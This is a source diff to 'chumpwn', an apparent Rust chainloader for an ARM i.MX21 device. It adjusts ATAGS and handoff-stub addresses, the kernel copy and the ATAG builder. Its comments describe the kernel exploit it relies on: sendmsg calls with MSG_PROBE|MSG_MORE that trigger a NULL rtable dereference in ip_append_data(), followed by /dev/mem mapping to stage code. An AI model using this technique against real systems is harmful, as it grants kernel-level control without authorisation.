@@ -102,13 +102,13 @@ const INITRD_DST_PHYS: u32 = 0xc280_0000;
 const INITRD_DST_VA: u32 = 0x0280_0000;
 const INITRD_MAP_LEN: u32 = 0x0020_0000;
 
-/* Staging for ATAGS and the handoff stub.  These pages are free at rcS on
- * the stock kernel (verified with QEMU loaders); they are inside the 64 MiB
- * direct map, so the stub can execute there with the MMU on. */
-const ATAGS_PHYS: u32 = 0xc2f0_0000;
-const ATAGS_VA: u32 = 0x02f0_0000;
-const STUB_PHYS: u32 = 0xc2f8_0000;
-const STUB_VA: u32 = 0x02f8_0000;
+/* The C chainload's ATAGS/stub addresses.  The stock kernel's direct map
+ * covers all 64 MiB, so the stub executes here with the MMU on and continues
+ * at the same physical address after the MMU is disabled. */
+const ATAGS_PHYS: u32 = 0xc3f0_0000;
+const ATAGS_VA: u32 = 0x03f0_0000;
+const STUB_PHYS: u32 = 0xc3f8_0000;
+const STUB_VA: u32 = 0x03f8_0000;
 
 const PAGE: u32 = 0x1000;
 
@@ -250,10 +250,10 @@ jump_blob_start:
     mcr     p15, 0, r0, c8, c7, 0   @ invalidate TLB
     ldr     pc, [pc, #0]
     nop
-    .word   0xc2f80000
+    .word   0xc3f80000
 jump_blob_end:
 
-    /* Handoff stub copied to physical 0xc2f80000.  Entered in SVC mode
+    /* Handoff stub copied to physical 0xc3f80000.  Entered in SVC mode
        with the MMU on, identity-mapped, so clearing the MMU leaves the PC
        on the same physical instruction. */
     .section .text.stub_blob,"ax",%progbits
@@ -278,7 +278,7 @@ stub_blob_start:
     nop
     ldr     r0, =0
     ldr     r1, =851
-    ldr     r2, =0xc2f00000
+    ldr     r2, =0xc3f00000
     ldr     pc, =0xc2000000
     .ltorg
 stub_blob_end:
@@ -437,6 +437,10 @@ struct Msghdr {
     flags: u32,
 }
 
+/* C chainload.c trigger_poc() and stage2/exploit.c: two sendmsg calls on a
+ * loopback UDP socket.  MSG_PROBE|MSG_MORE on the first makes
+ * ip_append_data() dereference the NULL rtable; the second reaches
+ * rt->u.dst.output at 0x74. */
 unsafe fn trigger() -> isize {
     let sin = SockaddrIn {
         family: AF_INET as u16,
@@ -467,10 +471,15 @@ unsafe fn trigger() -> isize {
     }
 }
 
+/* C chainload.c cacheflush(): ARM private syscall 0x0f0002.  The handoff
+ * runs with the MMU off, so every staged byte must reach physical memory. */
 unsafe fn cacheflush(start: u32, end: u32) -> isize {
     syscall3(SYS_CACHEFLUSH, start as usize, end as usize, 0)
 }
 
+/* C chainload.c map_phys(): mmap2 /dev/mem with MAP_FIXED; the i.MX21 is
+ * above the 3 GiB user/kernel split, so each physical page also needs a
+ * low user virtual address. */
 unsafe fn map_phys(fd: usize, va: u32, pa: u32, len: u32) -> isize {
     syscall6(
         SYS_MMAP2,
@@ -501,57 +510,44 @@ unsafe fn copy_volatile(dst: *mut u8, src: *const u8, len: usize) {
     }
 }
 
-unsafe fn copy_backward(dst: u32, src: u32, len: u32) {
-    let d = dst as *mut u8;
-    let s = src as *const u8;
-    let mut i = len;
-    while i > 0 {
-        i -= 1;
-        core::ptr::write_volatile(d.add(i as usize), core::ptr::read_volatile(s.add(i as usize)));
-    }
-}
-
+/* C chainload.c build_atags(), plus ATAG_INITRD2 for a separate initramfs.
+ * ARM ATAGS are a sequence of {size, tag, payload...} words; ATAG_MEM is
+ * {size, start}, ATAG_INITRD2 is {start, size}, and ATAG_NONE is two zero
+ * words. */
 unsafe fn build_atags(p: u32, initrd_start: u32, initrd_size: u32, cmdline: &[u8]) {
-    let mut buf = [0u32; 64];
+    let q = p as *mut u32;
     let mut n = 0usize;
-    buf[n] = 2;
-    n += 1;
-    buf[n] = ATAG_CORE;
-    n += 1;
-    buf[n] = 4;
-    n += 1;
-    buf[n] = ATAG_MEM;
-    n += 1;
-    buf[n] = 0x0400_0000; // 64 MiB
-    n += 1;
-    buf[n] = 0xc000_0000;
-    n += 1;
-    buf[n] = 4;
-    n += 1;
-    buf[n] = ATAG_INITRD2;
-    n += 1;
-    buf[n] = initrd_start;
-    n += 1;
-    buf[n] = initrd_size;
-    n += 1;
-    let len = cmdline.len() + 1;
+    macro_rules! put {
+        ($v:expr) => {{
+            core::ptr::write_volatile(q.add(n), $v);
+            n += 1;
+        }};
+    }
+    put!(2); // ATAG_CORE
+    put!(ATAG_CORE);
+    put!(4); // ATAG_MEM
+    put!(ATAG_MEM);
+    put!(0x0400_0000); // 64 MiB, size then start
+    put!(0xc000_0000);
+    put!(4); // ATAG_INITRD2
+    put!(ATAG_INITRD2);
+    put!(initrd_start);
+    put!(initrd_size);
+    let len = cmdline.len() + 1; // include NUL
     let words = (len + 3) / 4;
-    buf[n] = 2 + words as u32;
-    n += 1;
-    buf[n] = ATAG_CMDLINE;
-    n += 1;
+    put!(2 + words as u32); // ATAG_CMDLINE
+    put!(ATAG_CMDLINE);
+    let s = q.add(n) as *mut u8; // cmdline bytes, zero-padded to words
     let mut j = 0;
     while j < words * 4 {
         let b = if j < cmdline.len() { cmdline[j] } else { 0 };
-        buf[n + j / 4] |= (b as u32) << ((j % 4) * 8);
+        core::ptr::write_volatile(s.add(j), b);
         j += 1;
     }
     n += words;
-    buf[n] = 0;
-    n += 1;
-    buf[n] = 0;
-    n += 1;
-    copy_volatile(p as *mut u8, buf.as_ptr() as *const u8, n * 4);
+    put!(0); // ATAG_NONE
+    put!(0);
+    let _ = n;
 }
 
 // ---------------------------------------------------------------------------
@@ -605,7 +601,11 @@ unsafe fn read_file(path: &[u8], dst: u32, max: u32) -> Option<u32> {
     Some(got)
 }
 
-unsafe fn load_container(base_va: u32, kernel_dst: u32, initrd_dst: u32) -> Option<(u32, u32)> {
+/* Read the QEMU loader container: header, then zImage at +0x1000 and the
+ * initramfs after it.  The zImage destination is the container base (the
+ * kernel's normal load address); copying forward is safe because the header
+ * has been parsed and dest < source. */
+unsafe fn load_container(base_va: u32, initrd_dst: u32) -> Option<(u32, u32)> {
     let h = &*(base_va as *const Header);
     if &h.magic != b"CHUMPWN1" {
         return None;
@@ -637,13 +637,7 @@ unsafe fn load_container(base_va: u32, kernel_dst: u32, initrd_dst: u32) -> Opti
         return None;
     }
     print_str("chumpwn: copying kernel...\n");
-    if kernel_dst == base_va + kernel_off {
-        /* already in place */
-    } else if kernel_dst < base_va + kernel_off {
-        copy(kernel_dst, base_va + kernel_off, kernel_size);
-    } else {
-        copy_backward(kernel_dst, base_va + kernel_off, kernel_size);
-    }
+    copy(base_va, base_va + kernel_off, kernel_size);
     print_str("chumpwn: copying initramfs...\n");
     copy(initrd_dst, base_va + initrd_off, initrd_size);
     print_str("chumpwn: copies done\n");
@@ -790,7 +784,7 @@ pub unsafe extern "C" fn chumpwn_main(sp: *const u32) -> ! {
     let kernel_size;
     let initrd_size;
     if let Some(base) = source {
-        match load_container(SRC_VA, SRC_VA, INITRD_DST_VA) {
+        match load_container(SRC_VA, INITRD_DST_VA) {
             Some((k, r)) => {
                 kernel_size = k;
                 initrd_size = r;
